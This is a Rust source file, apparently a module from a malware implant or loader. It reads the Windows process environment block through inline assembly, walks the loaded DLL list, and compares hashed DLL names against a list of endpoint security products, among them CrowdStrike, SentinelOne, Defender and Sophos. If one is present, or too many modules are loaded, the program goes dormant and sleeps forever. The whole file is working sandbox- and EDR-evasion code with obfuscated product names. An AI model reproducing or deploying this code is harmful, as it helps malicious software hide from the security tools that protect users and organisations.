use core::arch::asm;

#[derive(Debug)]
pub enum EnvStatus {
    Clean,
    SuspiciousCount(usize),
    KnownEDR(u32),
}

const EDR_HASHES: &[(u32, &str)] = &[
    (0x5DAA3B98, "cs"),    // csagent.dll            — CrowdStrike Falcon
    (0xAA3A5C06, "cs"),    // CSFalconContainer.dll  — CrowdStrike container
    (0x1AE078E6, "s1"),    // InProcessClient64.dll  — SentinelOne
    (0xDE1DB955, "s1"),    // InProcessSecurity64.dll — SentinelOne
    (0x3D8F6C24, "xdr"),   // cyinjct.dll            — Cortex XDR
    (0x6FBD4E25, "xdr"),   // cytool.dll             — Cortex XDR
    (0xC2A86C0F, "el"),    // elastic-endpoint.dll   — Elastic Defend
    (0xB4E7A3D1, "mde"),   // MpClient.dll           — Microsoft Defender
    (0x29D3DC85, "mde"),   // MpOav.dll              — Defender on-access
    (0xD37A4F02, "cb"),    // cbstream.dll            — Carbon Black
    (0xEF5B710A, "soph"),  // sophos_detoured.dll     — Sophos
    (0x8C1E3DA7, "cyl"),   // CyMemDef64.dll         — Cylance
];

fn crc32(name: &[u16]) -> u32 {
    let mut crc: u32 = 0xFFFF_FFFF;
    for &wch in name {
        let lower = if wch >= 0x41 && wch <= 0x5A { wch + 0x20 } else { wch };
        let bytes = lower.to_le_bytes();
        for &b in &bytes {
            crc ^= b as u32;
            for _ in 0..8 {
                crc = if crc & 1 != 0 { (crc >> 1) ^ 0xEDB8_8320 } else { crc >> 1 };
            }
        }
    }
    !crc
}

#[cfg(target_arch = "x86_64")]
unsafe fn peb_ptr() -> *const u8 {
    let peb: *const u8;
    asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, nomem));
    peb
}

unsafe fn walk_modules<F: FnMut(*const u8, &[u16]) -> bool>(mut visitor: F) {
    let peb = peb_ptr();
    if peb.is_null() { return; }

    let ldr = *(peb.add(0x18) as *const *const u8);
    if ldr.is_null() { return; }

    let head = ldr.add(0x20) as *const *const u8;
    let mut entry = *head;

    while !entry.is_null() && entry != head as *const u8 {
        // LDR_DATA_TABLE_ENTRY.BaseDllName (UNICODE_STRING) at offset 0x50 (x64)
        let name_len = *(entry.add(0x50) as *const u16) as usize / 2;
        let name_buf = *(entry.add(0x58) as *const *const u16);

        if !name_buf.is_null() && name_len > 0 && name_len < 512 {
            let name_slice = core::slice::from_raw_parts(name_buf, name_len);
            if !visitor(entry, name_slice) {
                return;
            }
        }

        entry = *(entry as *const *const u8);
    }
}

pub unsafe fn count_loaded_modules() -> usize {
    let mut count: usize = 0;
    walk_modules(|_, _| { count += 1; true });
    count
}

pub unsafe fn check_edr_dlls() -> Option<u32> {
    let mut found: Option<u32> = None;
    walk_modules(|_, name| {
        let h = crc32(name);
        for &(edr_hash, _) in EDR_HASHES {
            if h == edr_hash {
                found = Some(h);
                return false;
            }
        }
        true
    });
    found
}

pub unsafe fn check_environment() -> EnvStatus {
    if let Some(hash) = check_edr_dlls() {
        return EnvStatus::KnownEDR(hash);
    }

    let count = count_loaded_modules();
    if count > crate::config::max_loaded_dlls {
        return EnvStatus::SuspiciousCount(count);
    }

    EnvStatus::Clean
}

pub fn gate() {
    let status = unsafe { check_environment() };
    match status {
        EnvStatus::Clean => {
            crate::dlog!("edrcheck: clean (modules ok)");
        }
        EnvStatus::SuspiciousCount(n) => {
            crate::dlog!("edrcheck: suspicious module count={n}, dormant");
            loop {
                std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
            }
        }
        EnvStatus::KnownEDR(h) => {
            crate::dlog!("edrcheck: known EDR hash=0x{h:08X}, dormant");
            loop {
                std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
            }
        }
    }
}
